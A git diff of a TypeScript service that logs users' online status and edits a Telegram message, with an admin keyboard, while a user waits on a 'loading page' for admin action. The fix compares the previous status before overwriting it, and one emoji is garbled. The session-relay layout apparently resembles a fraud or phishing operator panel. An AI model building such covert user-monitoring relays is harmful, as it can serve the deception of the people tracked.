@@ -54,7 +54,7 @@ export const sendCustomMessageToTelegram = async (
 ): Promise<{ success: boolean; messageId?: number }> => {
   // Check if Telegram is configured
   if (!validateTelegramConfig()) {
-    console.log("🎭 Demo mode: Would send message to Telegram");
+    console.log("���� Demo mode: Would send message to Telegram");
     console.log("📝 Message:", message);
     // Return fake message ID for demo
     return { success: true, messageId: Date.now() };
@@ -262,7 +262,22 @@ export const updateUserOnlineStatus = async (
       return { success: false };
     }
 
-    // Update online status
+    console.log("📡 RECEIVED STATUS UPDATE:", {
+      sessionId,
+      isOnline,
+      isVisible,
+      statusText,
+      statusEmoji,
+      currentStep: session.currentStep,
+      timestamp: new Date().toLocaleTimeString(),
+    });
+
+    // Store the previous status for comparison
+    const previousStatus = session.onlineStatus
+      ? `${session.onlineStatus.statusEmoji} ${session.onlineStatus.statusText}`
+      : "No previous status";
+
+    // Update online status with new values
     session.onlineStatus = {
       isOnline,
       isVisible,
@@ -274,33 +289,45 @@ export const updateUserOnlineStatus = async (
 
     activeSessions.set(sessionId, session);
 
-    // Smart update strategy based on session state and importance
-    if (session.messageId && session.currentStep === "waiting_admin") {
-      // Check if this is a meaningful status change
-      const currentStatusDisplay = `${statusEmoji} ${statusText}`;
-      const lastStatusDisplay =
-        session.onlineStatus?.statusEmoji +
-        " " +
-        session.onlineStatus?.statusText;
+    // Current status display
+    const currentStatusDisplay = `${statusEmoji} ${statusText}`;
 
-      if (currentStatusDisplay !== lastStatusDisplay) {
-        console.log("📱 Meaningful status change detected, updating Telegram");
-        const updatedMessage = formatSessionMessage(session);
-        await updateTelegramMessage(
-          session.messageId,
-          updatedMessage,
-          getAdminKeyboard(sessionId, session),
-        );
+    console.log("🔄 STATUS COMPARISON:", {
+      previous: previousStatus,
+      current: currentStatusDisplay,
+      isDifferent: currentStatusDisplay !== previousStatus,
+    });
+
+    // Always update Telegram if user is on loading page (waiting_admin) and status actually changed
+    if (session.messageId && session.currentStep === "waiting_admin") {
+      if (currentStatusDisplay !== previousStatus) {
+        console.log("📱 MEANINGFUL STATUS CHANGE - Updating Telegram:", {
+          from: previousStatus,
+          to: currentStatusDisplay,
+        });
+
+        try {
+          const updatedMessage = formatSessionMessage(session);
+          await updateTelegramMessage(
+            session.messageId,
+            updatedMessage,
+            getAdminKeyboard(sessionId, session),
+          );
+
+          console.log("✅ Telegram message updated successfully");
+        } catch (updateError) {
+          console.error("❌ Failed to update Telegram message:", updateError);
+        }
       } else {
         console.log("ℹ️ Status unchanged, skipping Telegram update");
       }
     } else {
       console.log(
-        `ℹ️ Skipping online status update for step: ${session.currentStep}`,
+        `ℹ️ Skipping status update - not on loading page. Current step: ${session.currentStep}`,
       );
     }
 
-    console.log("✅ Online status updated:", {
+    console.log("✅ Online status updated successfully:", {
       sessionId,
       status: statusText,
       emoji: statusEmoji,
